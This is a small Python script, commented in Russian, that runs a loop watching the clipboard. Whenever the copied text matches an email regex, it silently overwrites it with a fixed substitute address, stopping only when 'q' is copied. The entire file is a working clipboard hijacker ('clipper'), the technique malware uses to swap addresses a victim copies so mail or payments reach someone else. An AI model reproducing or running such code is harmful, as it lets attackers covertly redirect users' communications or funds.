import re #модуль re эффективный модуль использующий регулярные выражения
import pyperclip
import time
#regex - сравнивает текст находящийся в буфере обмена
regex = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")
#подменный емайл
x = 'explane@email.com'
while True:
    email = pyperclip.paste() #получаем содержимое бужфера
    if re.fullmatch(regex, email): #сравниваем
        s = pyperclip.copy(x) #подменяем выражение в буфере обмена
        time.sleep(1) #ждем 1 секунду
    elif email == 'Q' or email == 'q': #цикл осанавливается если в буфере находится Qq
        break




